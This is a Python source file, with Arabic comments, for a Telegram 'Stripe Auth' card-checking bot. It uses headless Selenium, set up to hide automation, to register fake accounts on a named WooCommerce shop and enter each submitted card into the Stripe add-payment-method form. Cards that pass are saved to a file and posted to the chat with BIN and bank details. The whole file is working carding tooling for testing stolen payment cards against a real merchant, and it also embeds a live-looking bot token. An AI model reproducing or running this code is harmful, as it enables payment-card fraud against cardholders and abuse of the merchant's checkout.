import os
import re
import time
import random
import asyncio
from threading import Thread, Lock
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

# ------------------- الإعدادات -------------------
BASE_URL = "https://associationsmanagement.com"
MY_ACCOUNT_URL = f"{BASE_URL}/my-account/"
ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"
PAYMENT_METHODS_URL = f"{BASE_URL}/my-account/payment-methods/"
DEFAULT_ZIP = "10080"
BOT_TOKEN = "7604714419:AAGVMdDp-FyFTOMJgrW9_Mm04T-pvNhSiNY"

# قائمة المسموح لهم (أضف الـ user_id هنا)
ALLOWED_USERS = [1264607403, 987654321]

FIRST_NAMES = ["james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles",
               "mary", "patricia", "jennifer", "linda", "elizabeth", "barbara", "susan", "jessica", "sarah", "karen"]
LAST_NAMES = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez",
              "wilson", "anderson", "taylor", "thomas", "moore", "jackson", "martin", "lee", "perez", "thompson"]
DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com", "aol.com"]

stop_flag = False
stop_lock = Lock()

# Session موحد لجلب BIN info (أسرع)
bin_session = requests.Session()
bin_session.headers.update({"User-Agent": "Mozilla/5.0"})
bin_cache = {}


# ------------------- التحقق من المسموحين -------------------
def is_allowed(user_id):
    if not ALLOWED_USERS:
        return True
    return user_id in ALLOWED_USERS


# ------------------- التحقق من صحة البطاقة (Luhn) -------------------
def luhn_check(card_number):
    digits = [int(d) for d in card_number if d.isdigit()]
    if len(digits) < 13:
        return False
    checksum = 0
    reverse_digits = digits[::-1]
    for i, d in enumerate(reverse_digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0


# ------------------- جلب معلومات BIN (antipublic) -------------------
def dato(bin_code):
    if bin_code in bin_cache:
        return bin_cache[bin_code]
    try:
        api_url = bin_session.get(
            f"https://bins.antipublic.cc/bins/{bin_code}",
            timeout=5
        ).json()
        brand = api_url.get("brand", "Unknown")
        card_type = api_url.get("type", "Unknown")
        level = api_url.get("level", "Unknown")
        bank = api_url.get("bank", "Unknown")
        country_name = api_url.get("country_name", "Unknown")
        country_flag = api_url.get("country_flag", "🏳️")
        result = f"""{brand} - {card_type} - {level}"""
        details = f"{bank} - {country_name} {country_flag}"
        bin_cache[bin_code] = (result, details, country_flag, bank, country_name)
        return result, details, country_flag, bank, country_name
    except Exception:
        bin_cache[bin_code] = ("Unknown", "N/A", "🏳️", "N/A", "Unknown")
        return "Unknown", "N/A", "🏳️", "N/A", "Unknown"


# ------------------- تحليل البطاقة -------------------
def parse_card(card_str):
    card_str = card_str.strip()
    if not card_str or card_str.startswith('#'):
        return None

    if '/' in card_str:
        parts = card_str.split('|')
        if len(parts) == 3:
            cc = parts[0].strip()
            month_year = parts[1].split('/')
            if len(month_year) == 2:
                month = month_year[0].strip()
                year = month_year[1].strip()
                cvv = parts[2].strip()
                card_str = f"{cc}|{month}|{year}|{cvv}"

    parts = card_str.split('|')
    if len(parts) != 4:
        return None

    cc = parts[0].strip().replace(' ', '')
    month = parts[1].strip().zfill(2)
    year = parts[2].strip()
    cvv = parts[3].strip()

    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return None
    if not month.isdigit() or int(month) < 1 or int(month) > 12:
        return None
    if not year.isdigit():
        return None
    if len(year) == 2:
        year = "20" + year
    elif len(year) != 4:
        return None
    if not cvv.isdigit() or len(cvv) not in (3, 4):
        return None

    return cc, month, year, cvv


def generate_realistic_email():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    timestamp = str(int(time.time()))[-6:]
    random_num = random.randint(1000, 9999)
    domain = random.choice(DOMAINS)
    patterns = [
        f"{first}.{last}.{timestamp}",
        f"{first}{last}{random_num}",
        f"{first}_{last}_{timestamp}",
        f"{first}.{last}{random_num}",
    ]
    username = random.choice(patterns)
    return f"{username}@{domain}"


# ------------------- إعداد المتصفح -------------------
def setup_driver():
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--window-size=1920,1080')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                         "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")
    # تسريع إضافي
    options.add_argument('--blink-settings=imagesEnabled=false')
    options.add_argument('--disable-javascript')
    options.add_argument('--disable-extensions')
    options.add_argument('--disable-software-rasterizer')

    driver = webdriver.Chrome(options=options)
    driver.set_page_load_timeout(15)
    driver.set_window_size(1920, 1080)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    return driver


def register(driver, email):
    print(f"📝 تسجيل: {email}...")
    driver.get(MY_ACCOUNT_URL)
    wait = WebDriverWait(driver, 8)

    try:
        register_form = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "register")))
        nonce_input = register_form.find_element(By.NAME, "woocommerce-register-nonce")
        register_nonce = nonce_input.get_attribute("value")
    except:
        match = re.search(r'woocommerce-register-nonce["\']:\s*["\']([^"\']+)', driver.page_source)
        if match:
            register_nonce = match.group(1)
        else:
            raise Exception("nonce غير موجود")

    email_input = wait.until(EC.presence_of_element_located((By.ID, "reg_email")))
    email_input.clear()
    email_input.send_keys(email)

    driver.find_element(By.NAME, "register").click()
    time.sleep(1.5)

    error_elements = driver.find_elements(By.CLASS_NAME, "woocommerce-error")
    if error_elements:
        error_text = error_elements[0].text
        if "An account is already registered" in error_text:
            return False, "email_exists"
        return False, error_text
    if "logout" not in driver.page_source.lower():
        return False, "no_logout"
    return True, "success"


def add_card(driver, card_data):
    card_number, month, year, cvc = card_data
    expiry = f"{month}{year[-2:]}"
    print(f"💳 فحص ****{card_number[-4:]}...")
    driver.get(ADD_PAYMENT_URL)
    wait = WebDriverWait(driver, 12)

    try:
        stripe_iframe = wait.until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title*='Secure payment input frame']")))
        driver.switch_to.frame(stripe_iframe)
    except:
        try:
            stripe_iframe = wait.until(EC.presence_of_element_located((By.TAG_NAME, "iframe")))
            driver.switch_to.frame(stripe_iframe)
        except:
            return False, "iframe_not_found"

    try:
        wait.until(EC.presence_of_element_located((By.NAME, "number"))).send_keys(card_number)
        driver.find_element(By.NAME, "expiry").send_keys(expiry)
        driver.find_element(By.NAME, "cvc").send_keys(cvc)
        driver.find_element(By.NAME, "postalCode").send_keys(DEFAULT_ZIP)
        time.sleep(0.3)
    except Exception as e:
        driver.switch_to.default_content()
        return False, str(e)

    driver.switch_to.default_content()
    time.sleep(1)

    submit_button = None
    for by, selector in [
        (By.XPATH, "//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'add payment method')]"),
        (By.XPATH, "//button[contains(text(), 'Add payment method')]"),
        (By.NAME, "woocommerce_add_payment_method"),
        (By.CSS_SELECTOR, "button.button.alt"),
    ]:
        try:
            submit_button = wait.until(EC.element_to_be_clickable((by, selector)))
            break
        except:
            continue

    if not submit_button:
        try:
            submit_button = driver.find_element(By.CSS_SELECTOR, "form[method='post']").find_element(By.CSS_SELECTOR, "button[type='submit']")
        except:
            return False, "no_submit_button"

    driver.execute_script("arguments[0].scrollIntoView(true);", submit_button)
    time.sleep(0.2)
    try:
        submit_button.click()
    except:
        driver.execute_script("arguments[0].click();", submit_button)

    try:
        WebDriverWait(driver, 12).until(
            lambda d: (
                "/my-account/payment-methods/" in d.current_url or
                "Payment method successfully added" in d.page_source or
                len(d.find_elements(By.CSS_SELECTOR, ".woocommerce-error")) > 0
            )
        )

        if "Payment method successfully added" in driver.page_source:
            return True, "success"

        errors = driver.find_elements(By.CSS_SELECTOR, ".woocommerce-error")
        if errors:
            return False, errors[0].text.split('\n')[0][:50]
        if "/my-account/payment-methods/" in driver.current_url:
            return True, "success"
        return False, "unknown_error"
    except:
        return False, "timeout"


def delete_card_from_site(driver):
    try:
        driver.get(PAYMENT_METHODS_URL)
        time.sleep(0.8)
        for by, selector in [
            (By.XPATH, "//a[contains(text(), 'Delete')]"),
            (By.CSS_SELECTOR, "a.delete"),
            (By.CSS_SELECTOR, "a[href*='delete-payment-method']"),
        ]:
            try:
                btn = driver.find_element(by, selector)
                btn.click()
                time.sleep(0.8)
                try:
                    driver.find_element(By.XPATH, "//button[contains(text(), 'Confirm')]").click()
                except:
                    pass
                time.sleep(1)
                return
            except:
                continue
    except:
        pass


def logout(driver):
    try:
        driver.get(MY_ACCOUNT_URL)
        time.sleep(0.5)
        for by, selector in [
            (By.XPATH, "//a[contains(@href, 'customer-logout')]"),
            (By.XPATH, "//a[contains(text(), 'Logout')]"),
        ]:
            try:
                driver.find_element(by, selector).click()
                time.sleep(0.5)
                return
            except:
                continue
    except:
        pass


# ------------------- حفظ البطاقات الناجحة -------------------
def save_approved_card(card_data, bin_info):
    try:
        with open("approved_cards.txt", "a", encoding="utf-8") as f:
            f.write(f"{card_data[0]}|{card_data[1]}|{card_data[2]}|{card_data[3]} | {bin_info}\n")
    except:
        pass


# ------------------- معالجة بطاقة واحدة -------------------
def process_single_card(card_data):
    driver = None
    try:
        driver = setup_driver()
        register_success = False
        register_attempts = 0
        while not register_success and register_attempts < 2:
            email = generate_realistic_email()
            register_attempts += 1
            ok, err = register(driver, email)
            if ok:
                register_success = True
            elif err != "email_exists":
                return ("error", f"فشل التسجيل: {err}")
        if not register_success:
            return ("error", "لم نتمكن من التسجيل")
        success, message = add_card(driver, card_data)
        if success:
            delete_card_from_site(driver)
            logout(driver)
            return ("success", card_data)
        else:
            logout(driver)
            return ("fail", message)
    except Exception as e:
        return ("error", str(e))
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


# ------------------- معالجة دفعة البطاقات -------------------
def process_batch_cards(cards, update, context, loop, progress_message_id):
    global stop_flag
    total = len(cards)
    auth_count = 0
    decline_count = 0
    skip_count = 0
    success_cards = []
    lock = Lock()

    with stop_lock:
        stop_flag = False

    driver = setup_driver()

    try:
        for idx, card in enumerate(cards, 1):
            with stop_lock:
                if stop_flag:
                    asyncio.run_coroutine_threadsafe(
                        context.bot.edit_message_text(
                            chat_id=update.effective_chat.id,
                            message_id=progress_message_id,
                            text="⛔ تم إيقاف الفحص.",
                            reply_markup=None
                        ), loop
                    )
                    return

            card_str = f"{card[0]}|{card[1]}|{card[2]}|{card[3]}"
            current_short = card_str[:22] + "..."
            progress = int((idx / total) * 100)

            # جلب BIN info مسبقاً
            bin_info, bin_details, country_flag, bank, country_name = dato(card[0][:6])

            keyboard = [
                [InlineKeyboardButton(f"• {current_short} •", callback_data="u8")],
                [InlineKeyboardButton(f"• Response ➜ ... •", callback_data="u8")],
                [InlineKeyboardButton(f"• Info ➜ {bin_info} •", callback_data="x")],
                [InlineKeyboardButton(f"• Approved ✅ ➜ [ {auth_count} ] •", callback_data="x")],
                [InlineKeyboardButton(f"• Declined ❌ ➜ [ {decline_count} ] •", callback_data="x")],
                [InlineKeyboardButton(f"• Skipped ⏭️ ➜ [ {skip_count} ] •", callback_data="x")],
                [InlineKeyboardButton(f"• Total 👻 ➜ [ {total} ] ─ {progress}% •", callback_data="x")],
                [InlineKeyboardButton("[ إيقاف ]", callback_data="stop")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            asyncio.run_coroutine_threadsafe(
                context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=progress_message_id,
                    text="🔄 جاري الفحص...",
                    reply_markup=reply_markup
                ), loop
            )

            # تسجيل
            register_success = False
            register_attempts = 0
            while not register_success and register_attempts < 2:
                email = generate_realistic_email()
                register_attempts += 1
                ok, err = register(driver, email)
                if ok:
                    register_success = True
                elif err != "email_exists":
                    break

            if not register_success:
                with lock:
                    decline_count += 1
                keyboard[1][0] = InlineKeyboardButton("• Response ➜ Reg Failed •", callback_data="u8")
                keyboard[4][0] = InlineKeyboardButton(f"• Declined ❌ ➜ [ {decline_count} ] •", callback_data="x")
                reply_markup = InlineKeyboardMarkup(keyboard)
                asyncio.run_coroutine_threadsafe(
                    context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=progress_message_id,
                        text="🔄 جاري الفحص...",
                        reply_markup=reply_markup
                    ), loop
                )
                continue

            # فحص البطاقة
            success, message = add_card(driver, card)

            if success:
                with lock:
                    auth_count += 1
                    success_cards.append(card)
                success_text = (
                    f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ \n\n"
                    f"💳 𝗖𝗮𝗿𝗱 ➜ `{card[0]}|{card[1]}|{card[2]}|{card[3]}`\n"
                    f"➤ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ Stripe Auth\n"
                    f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ Approved\n\n"
                    f"[ϟ] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➜ {bin_info}\n"
                    f"[ϟ] 𝐁𝐚𝐧𝐤 ➜ {bin_details}\n"
                    f"[ϟ] Bot by @AmrElwani"
                )
                asyncio.run_coroutine_threadsafe(
                    update.message.reply_text(success_text, parse_mode='Markdown'), loop
                )
                save_approved_card(card, bin_info)
                delete_card_from_site(driver)
                last_response = "Approved ✅"
            else:
                with lock:
                    decline_count += 1
                last_response = message[:30]

            keyboard[1][0] = InlineKeyboardButton(f"• Response ➜ {last_response} •", callback_data="u8")
            keyboard[3][0] = InlineKeyboardButton(f"• Approved ✅ ➜ [ {auth_count} ] •", callback_data="x")
            keyboard[4][0] = InlineKeyboardButton(f"• Declined ❌ ➜ [ {decline_count} ] •", callback_data="x")
            reply_markup = InlineKeyboardMarkup(keyboard)
            asyncio.run_coroutine_threadsafe(
                context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=progress_message_id,
                    text="🔄 جاري الفحص...",
                    reply_markup=reply_markup
                ), loop
            )

            logout(driver)

    except Exception as e:
        asyncio.run_coroutine_threadsafe(
            update.message.reply_text(f"❌ خطأ: {str(e)}"), loop
        )
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

    final_text = (
        f"✔️ **اكتمل الفحص!**\n\n"
        f"Total Auth ✅: {auth_count}\n"
        f"Total Decline ❌: {decline_count}\n"
        f"Total Skipped ⏭️: {skip_count}\n"
        f"Total Checked ⏱️: {total}\n\n"
        f"Auth ➡ [{auth_count}] ✅\n"
        f"Decline ➡ [{decline_count}] ❌\n"
        f"Total ➡ [{total}] 🎯"
    )
    asyncio.run_coroutine_threadsafe(
        context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=progress_message_id,
            text=final_text,
            parse_mode='Markdown'
        ), loop
    )

    if success_cards:
        lines = ["✅ **البطاقات الناجحة:**"]
        for c in success_cards:
            lines.append(f"`{c[0]}|{c[1]}|{c[2]}|{c[3]}`")
        asyncio.run_coroutine_threadsafe(
            update.message.reply_text("\n".join(lines), parse_mode='Markdown'), loop
        )


# ------------------- معالجات البوت -------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_allowed(user_id):
        await update.message.reply_text("🚫 غير مصرح لك باستخدام البوت.")
        return
    await update.message.reply_text(
        "👋 مرحباً بك في بوت فحص بطاقات Stripe Auth.\n\n"
        "📐 **التنسيقات المدعومة:**\n"
        "`CC|MM|YYYY|CVV`\n"
        "`CC|MM/YYYY|CVV`\n\n"
        "📤 أرسل بطاقة واحدة أو ارفع ملف `.txt`"
    )


async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_allowed(user_id):
        await update.message.reply_text("🚫 غير مصرح لك.")
        return

    card = parse_card(update.message.text)
    if not card:
        await update.message.reply_text("❌ تنسيق غير صحيح.\n`CC|MM|YYYY|CVV` أو `CC|MM/YYYY|CVV`", parse_mode='Markdown')
        return

    if not luhn_check(card[0]):
        await update.message.reply_text("❌ رقم البطاقة غير صالح (فشل Luhn).")
        return

    bin_info, bin_details, country_flag, bank, country_name = dato(card[0][:6])
    await update.message.reply_text(
        f"🔍 جاري الفحص...\n\n"
        f"📊 **BIN Info:**\n{bin_info}\n{bin_details}",
        parse_mode='Markdown'
    )

    loop = asyncio.get_running_loop()

    def worker():
        result = process_single_card(card)
        asyncio.run_coroutine_threadsafe(send_result(update, context, result, card), loop)

    Thread(target=worker).start()


async def send_result(update: Update, context: ContextTypes.DEFAULT_TYPE, result, card):
    bin_info, bin_details, country_flag, bank, country_name = dato(card[0][:6])
    if result[0] == "success":
        save_approved_card(card, bin_info)
        text = (
            f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ \n\n"
            f"💳 𝗖𝗮𝗿𝗱 ➜ `{card[0]}|{card[1]}|{card[2]}|{card[3]}`\n"
            f"➤ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ Stripe Auth\n"
            f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ Approved\n\n"
            f"[ϟ] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➜ {bin_info}\n"
            f"[ϟ] 𝐁𝐚𝐧𝐤 ➜ {bin_details}\n"
            f"[ϟ] Bot by @AmrElwani"
        )
        await update.message.reply_text(text, parse_mode='Markdown')
    elif result[0] == "fail":
        await update.message.reply_text(
            f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
            f"💳 `{card[0]}|{card[1]}|{card[2]}|{card[3]}`\n"
            f"❌ {result[1]}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(f"⚠️ خطأ: {result[1]}")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag
    user_id = update.effective_user.id
    if not is_allowed(user_id):
        await update.message.reply_text("🚫 غير مصرح لك.")
        return

    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ ارفع ملف `.txt` فقط.")
        return

    file = await document.get_file()
    content = await file.download_as_bytearray()
    lines = content.decode('utf-8', errors='ignore').splitlines()

    cards = []
    skipped = 0
    for line in lines:
        card = parse_card(line)
        if card:
            if luhn_check(card[0]):
                cards.append(card)
            else:
                skipped += 1

    if not cards:
        msg = "❌ لم يتم العثور على بطاقات صحيحة."
        if skipped > 0:
            msg += f"\n⏭️ تم تخطي {skipped} بطاقة (فشل Luhn)."
        await update.message.reply_text(msg)
        return

    extra = f"\n⏭️ تم تخطي {skipped} بطاقة غير صالحة." if skipped > 0 else ""

    keyboard = [
        [InlineKeyboardButton("• ... •", callback_data="u8")],
        [InlineKeyboardButton("• Response ➜ ... •", callback_data="u8")],
        [InlineKeyboardButton("• Info ➜ ... •", callback_data="x")],
        [InlineKeyboardButton("• Approved ✅ ➜ [ 0 ] •", callback_data="x")],
        [InlineKeyboardButton("• Declined ❌ ➜ [ 0 ] •", callback_data="x")],
        [InlineKeyboardButton(f"• Total 👻 ➜ [ {len(cards)} ] ─ 0% •", callback_data="x")],
        [InlineKeyboardButton("[ إيقاف ]", callback_data="stop")]
    ]
    msg = await update.message.reply_text(
        f"🔄 جاري فحص {len(cards)} بطاقة...{extra}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    progress_message_id = msg.message_id
    loop = asyncio.get_running_loop()
    Thread(target=process_batch_cards, args=(cards, update, context, loop, progress_message_id)).start()


async def stop_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag
    query = update.callback_query
    await query.answer()
    if query.data == "stop":
        with stop_lock:
            stop_flag = True
        await query.edit_message_text("⏳ جاري إيقاف الفحص...")


async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🔢 معرفك: `{update.effective_user.id}`", parse_mode='Markdown')


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("myid", myid))
    app.add_handler(CallbackQueryHandler(stop_batch, pattern="stop"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_single_card))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("✅ البوت يعمل...")
    app.run_polling()


if __name__ == "__main__":
    main()